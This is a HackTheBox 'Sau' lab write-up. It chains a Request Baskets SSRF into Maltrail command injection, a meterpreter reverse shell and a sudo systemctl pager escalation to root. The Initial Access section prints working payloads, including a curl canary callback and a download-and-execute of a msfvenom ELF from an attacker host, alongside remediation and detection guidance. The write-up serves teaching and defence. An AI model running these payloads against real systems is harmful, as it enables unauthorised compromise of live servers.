---
layout: default
title: "HackTheBox - Sau"
---

# HackTheBox - Sau

**OS:** Linux (Ubuntu)

Sau is a Linux machine that chains a Server-Side Request Forgery in an internet-facing
**Request Baskets 1.2.1** instance (CVE-2023-27163) into Remote Code Execution against an
internal-only **Maltrail 0.53** service, then escalates through a single over-permissive
`sudo` rule. A firewall exposes only SSH and Request Baskets on 55555; ports 80 and 8338 are
filtered from outside. The SSRF lets us reach the firewalled web app on `127.0.0.1:80`, which
turns out to be Maltrail. Maltrail 0.53 has an unauthenticated OS command injection in the
login form, so we proxy a command-injection request through the basket to land a shell as the
`puma` service account. From there, `puma` may run `sudo systemctl status trail.service`, and
because `systemctl` pages its output through `less`, the well-known GTFOBins pager break-out
(`!sh`) hands back a root shell.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` (sau) |
| Initial Access | Request Baskets SSRF (CVE-2023-27163) -> internal Maltrail 0.53 unauth command injection -> reverse shell as `puma` |
| Privilege Escalation | `sudo systemctl status` pager (`less`) break-out (GTFOBins) |
| Final Access | `root` |

---

## Recon

### Port Scan

A full TCP scan showed only three reachable ports, with two more reported `filtered`. SSH on
22 and an unknown HTTP-speaking service on 55555 are the only things actually answering;
80 and 8338 are firewalled off from the outside.

```
$ nmap -p- --min-rate 5000 -T4 <target-ip>
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown
```

A targeted service scan on the open ports fingerprinted 22 as OpenSSH and could not name 55555,
but the banner it dumped is the giveaway: a `302` redirect to `/web` and an error string
`invalid basket name; the name does not match pattern`.

```
$ nmap -sCV -p22,55555 <target-ip>
22/tcp    open  ssh
55555/tcp open  unknown
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.0 302 Found
|     Location: /web
|   FourOhFourRequest:
|     HTTP/1.0 400 Bad Request
|     invalid basket name; the name does not match pattern: ^[\w\d\-_\.]{1,250}$
Service Info: OS: Linux
```

> **Why this works:** even when `nmap` cannot map a banner to a known service, the literal
> strings it echoes back are searchable. "basket name" plus the `/web` redirect points straight
> at **Request Baskets**, a Go HTTP request-collector. That single string saved a round of
> guessing.

### Identifying Request Baskets

Browsing 55555 confirms it and, more importantly, leaks the exact version from the web UI.
Version is the whole game here, 1.2.1 is the last vulnerable build for CVE-2023-27163.

```
$ curl -s http://<target-ip>:55555/web | grep -i version
  Version: 1.2.1
```

| Port | Proto | Service | Notes |
|---|---|---|---|
| 22 | TCP | SSH | OpenSSH, not the way in |
| 80 | TCP | HTTP | **filtered** from outside, reachable only via SSRF |
| 8338 | TCP | unknown | filtered, never needed |
| 55555 | TCP | HTTP | Request Baskets 1.2.1 (SSRF, CVE-2023-27163) |

---

## Initial Access

### CVE-2023-27163, Request Baskets SSRF

Request Baskets lets anyone create a "basket", a named inbox that captures HTTP requests sent
to it. A basket can also be configured to **forward** captured requests to an arbitrary
`forward_url`, and when `proxy_response` is enabled the upstream response is streamed straight
back to the client. There is no validation that `forward_url` points anywhere external, so a
basket pointed at `http://127.0.0.1:80/` turns the server into an open SSRF proxy into its own
loopback, exactly the firewalled port we could not reach directly.

Create a basket whose forward target is the internal web service. The API returns a token (not
needed for this attack, but it is what authorizes later admin operations on the basket):

```
$ curl -s -X POST http://<target-ip>:55555/api/baskets/sua78d2ae78 \
    -H 'Content-Type: application/json' \
    -d '{"forward_url":"http://127.0.0.1:80/","proxy_response":true,"expand_path":true,"capacity":250}'
{"token":"Gn**********************************************"}
```

Key fields:

| Field | Value | Effect |
|---|---|---|
| `forward_url` | `http://127.0.0.1:80/` | the firewalled internal target |
| `proxy_response` | `true` | stream the upstream response back to us (this is what makes it readable SSRF) |
| `expand_path` | `true` | append our request path onto `forward_url`, so `/<basket>/login` -> `127.0.0.1:80/login` |

Now any request to the basket path is proxied to the internal service. Fetching the basket
root returns the firewalled app, and its `Server` header identifies it immediately:

```
$ curl -s -i http://<target-ip>:55555/sua78d2ae78/ | head
HTTP/1.1 200 OK
Server: Maltrail/0.53
Content-Type: text/html
...
<title>Maltrail</title>
```

> **Why this works:** the SSRF is "full-response" SSRF, not blind. `proxy_response: true` makes
> the basket relay the upstream status, headers, and body verbatim, so we both reach and read
> `127.0.0.1:80`. `expand_path: true` is what lets us hit arbitrary sub-paths like `/login`
> through the proxy instead of only the root.

### Internal Service: Maltrail 0.53 Unauthenticated Command Injection

Maltrail is a Python malicious-traffic detection system. Versions up to and including 0.53 have
an unauthenticated OS command injection in the login handler: the `username` POST parameter is
concatenated into a shell command line that Maltrail runs with `subprocess` and `shell=True`,
so a value like `;`command`;` is executed by the server. A failed login still returns `401`,
but the injected command runs regardless.

The catch is that Maltrail is only reachable on `127.0.0.1:80`, so the injection has to be
delivered **through the basket**. Because `expand_path` is set, a POST to `/<basket>/login` is
proxied to `127.0.0.1:80/login` with its body intact.

First, confirm code execution out-of-band before worrying about a shell. Encode the payload in
base64 to avoid quoting and `+`-vs-space problems as the body passes through the proxy:

```
$ python3 -m http.server 8000 --bind <attacker-ip>      # canary listener

$ B64=$(printf 'curl -s http://<attacker-ip>:8000/PWNED-$(whoami)' | base64 -w0)
$ curl -s -o /dev/null -w 'HTTP %{http_code}\n' \
    -X POST "http://<target-ip>:55555/sua78d2ae78/login" \
    --data-urlencode "username=;\`echo $B64 | base64 -d | bash\`"
HTTP 401
```

The canary HTTP server logs the call-back, and it tells us both that RCE works and which user
we are:

```
<target-ip> - - [24/Jun/2026 19:22:17] "GET /PWNED-puma HTTP/1.1" 404 -
```

> **Why this works:** Maltrail builds the auth-check command by string-concatenating the
> attacker-controlled `username` into a `shell=True` subprocess call. The leading `;` ends
> Maltrail's intended command; the back-ticked sub-shell then runs our payload. We base64-wrap
> the real command so that shell metacharacters and `+` bytes survive both URL-encoding and the
> Request Baskets proxy hop untouched.

### Confirming Egress, Then Catching the Shell

A first reverse-shell attempt to a high port never called back even though the HTTP canary on
8000 had worked, so the target is filtering outbound ports. A quick egress sweep (one canary
`curl` per candidate port, caught by throwaway listeners) showed 443, 4444, and 8443 all
egress, while 9001 was dropped. Lesson worth keeping: when you have confirmed code-exec but no
callback, test the port before blaming the payload.

```
port 443:  GET /EG-443  HTTP/1.1   <- egress OK
port 4444: GET /EG-4444 HTTP/1.1   <- egress OK
port 9001: (no callback)           <- dropped outbound
port 8443: GET /EG-8443 HTTP/1.1   <- egress OK
```

With a known-good port, catch the foothold with a Metasploit `multi/handler` and deliver a
matching meterpreter ELF. Reconstructed as run by hand:

```
$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=8443 -f elf -o sua_met
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
Payload size: 250 bytes
Saved as: sua_met

$ msfconsole -q -x "use exploit/multi/handler; \
    set payload linux/x64/meterpreter/reverse_tcp; \
    set LHOST <attacker-ip>; set LPORT 8443; run"
[*] Started reverse TCP handler on <attacker-ip>:8443
```

Host the ELF on the canary server, then fire one more injection through the basket to pull,
chmod, and execute it on the target:

```
$ B64=$(printf 'curl -s -o /tmp/.sm http://<attacker-ip>:8000/sua_met && chmod +x /tmp/.sm && /tmp/.sm &' | base64 -w0)
$ curl -s -X POST "http://<target-ip>:55555/sua78d2ae78/login" \
    --data-urlencode "username=;\`echo $B64 | base64 -d | bash\`"
```

```
[*] Sending stage (3045380 bytes) to <target-ip>
[*] Meterpreter session 1 opened (<attacker-ip>:8443 -> <target-ip>:57018)

meterpreter > getuid
Server username: puma
```

> **Gotcha worth recording:** outbound egress filtering bites here. The injection succeeds and
> the box runs the command, but a reverse shell to a filtered port simply never arrives. Always
> separate "did the command run" (verified out-of-band with the HTTP canary) from "did my shell
> connect" (a network-reachability question) so you debug the right layer.

### User Flag

```
puma@sau:/opt/maltrail$ id
uid=1001(puma) gid=1001(puma) groups=1001(puma)
puma@sau:/opt/maltrail$ hostname
sau
puma@sau:/opt/maltrail$ cat /home/puma/user.txt
<user-flag-redacted>
```

---

## Privilege Escalation

### sudo Enumeration

`puma` has exactly one `sudo` entitlement, and it is enough:

```
puma@sau:/opt/maltrail$ sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:...\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

### systemctl / less Pager Break-out (GTFOBins)

`systemctl status` prints to a pager when its output is longer than the terminal. On this box
the pager is `less`, and crucially `systemctl` is invoked **as root** via the `sudo` rule, so
the `less` process it spawns also runs as root. `less` lets you launch a shell with `!`, which
is the classic GTFOBins escalation for any program that pages output as a higher-privileged
user.

To make this work non-interactively, the terminal has to be small enough that `systemctl`
actually decides to page (otherwise it just prints and exits without ever opening `less`). With
a PTY whose window is shrunk to a handful of rows, the pager engages, and `!/bin/bash` drops a
root shell:

```
puma@sau:/opt/maltrail$ stty rows 8 cols 80
puma@sau:/opt/maltrail$ sudo /usr/bin/systemctl status trail.service
* trail.service - Maltrail. Server of malicious traffic detection system
     Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset: enabled)
     Active: active (running) since Thu 2026-06-25 01:38:08 UTC; 52min ago
   Main PID: 879 (python3)
     Tasks: 21 (limit: 4662)
lines 1-7
!/bin/bash          <- typed at the less ':' prompt

root@sau:/opt/maltrail# id
uid=0(root) gid=0(root) groups=0(root)
```

> **Why this works:** the danger is not `systemctl` itself, it is that a long-output subcommand
> is run as root and hands control to an interactive pager that has a shell-escape. `sudo`
> dropping you into `less` as root is functionally identical to `sudo less`. Restricting the
> rule to `status trail.service` does not help, because the privileged process you can reach
> (the pager) is the same regardless of which unit is queried.

### Root Flag

```
root@sau:/opt/maltrail# cat /root/root.txt
<root-flag-redacted>
```

---

## Root Cause

| Layer | Root cause |
|---|---|
| Request Baskets | CVE-2023-27163: `forward_url` accepts loopback/internal targets with no allow-list, and `proxy_response` relays the upstream body, giving full-read SSRF into firewalled services. |
| Maltrail 0.53 | Unauthenticated input (`username`) concatenated into a `shell=True` subprocess call in the login handler, a textbook OS command injection. |
| Host | A `sudo NOPASSWD` rule on `systemctl status`, a command that pages through `less` as root, exposing the GTFOBins pager shell-escape. |

The three are independent defects that line up into a full chain: the SSRF defeats the firewall
that was the only thing hiding Maltrail, Maltrail's RCE gives code-exec, and the sudo rule turns
a low-priv service account into root.

## Impact

Full remote compromise from a single internet-facing port with no credentials. An attacker
reaches a service the firewall was meant to isolate, executes code as the `puma` service
account, and escalates to `root`, total control of the host and any data or detection telemetry
Maltrail was collecting.

## Remediation

Priority-ordered. The first items break the attack chain outright; the rest are hardening.

1. **Upgrade Request Baskets** to a build after CVE-2023-27163, or restrict `forward_url` to an
   allow-list that forbids loopback, link-local, and RFC 1918 targets. This single fix removes
   the SSRF that exposes every firewalled internal service.
2. **Upgrade Maltrail** past 0.53. The login command injection is the RCE; patching it removes
   code-exec even if the SSRF remains.
3. **Remove or tighten the sudo rule.** `puma` should not be able to run anything that pages as
   root. If status visibility is genuinely required, grant it via `systemctl --no-pager` in a
   wrapper, or use `SYSTEMD_PAGER=cat`/`SYSTEMD_PAGERSECURE=1`, never a bare pager as root.
4. **Do not expose Request Baskets to the internet.** Bind it to localhost or put it behind
   authenticated access; it is a debugging tool, not an edge service.
5. **Run services unprivileged and isolated.** Maltrail and Request Baskets should run as
   dedicated, sandboxed users (systemd `ProtectSystem`, `NoNewPrivileges`, `PrivateTmp`) so an
   RCE in one cannot trivially pivot.

### Validation

- SSRF fixed: creating a basket with `forward_url=http://127.0.0.1:80/` and fetching it should
  be rejected or return nothing, not the Maltrail page.
- RCE fixed: POSTing `username=;`id`;` to Maltrail's `/login` should not execute; the Maltrail
  version banner should read > 0.53.
- sudo fixed: `sudo -l` as `puma` should no longer list `systemctl status`, or running it must
  not open an interactive pager (`SYSTEMD_PAGER` neutralised). Confirm `!sh` from any reachable
  pager fails.

## Detection Opportunities

- **Request Baskets**: alert on baskets whose `forward_url` resolves to loopback/internal ranges,
  and on a spike of proxied requests. Outbound connections from the app to `127.0.0.1:80` are
  abnormal for a request collector.
- **Maltrail**: `/login` POSTs containing shell metacharacters (`;`, back-ticks, `|`, `base64 -d`)
  in `username`; Maltrail spawning child processes such as `bash`, `curl`, or `python3` is a
  strong RCE signal (parent `python3` -> child `curl`/`bash`).
- **Host**: `curl`/`wget` writing to `/tmp` followed by a `chmod +x` and execution; an outbound
  connection from a freshly written `/tmp/.<random>` binary. Process auditing on `puma`.
- **Privesc**: `auditd` on `execve` of `/usr/bin/systemctl` by `puma` via `sudo`, and any `less`
  or shell child of a root `systemctl` process. A root shell whose parent chain is
  `sudo -> systemctl -> less -> bash` is unambiguous.

## Lessons Learned

- Full-response SSRF (`proxy_response`) is not blind, treat it as a readable pivot into the
  whole loopback/internal surface, not just a "can it reach X" oracle.
- A `filtered` port in `nmap` is not "safe", it is "reach it another way". The firewall here was
  the only control protecting a vulnerable Maltrail.
- Separate "command executed" from "shell connected" when debugging callbacks. Out-of-band
  verification (an HTTP canary) isolates RCE from egress filtering.
- Any `sudo` rule on a command that can page, edit, or shell out is effectively `sudo sh`.
  GTFOBins is the first place to check the moment `sudo -l` returns anything.

## Cleanup

- Removed the dropped meterpreter ELF from the target (`/tmp/.sm`).
- Terminated the meterpreter session and stopped the `multi/handler` job on the attack box.
- Stopped the local canary/egress-test HTTP listeners.
- Deleted the SSRF basket created on Request Baskets (`DELETE /api/baskets/<name>` with its token).
- No accounts, services, or persistence were left on the host; the root shell was interactive
  only. Nothing was written outside `/tmp` on the target.
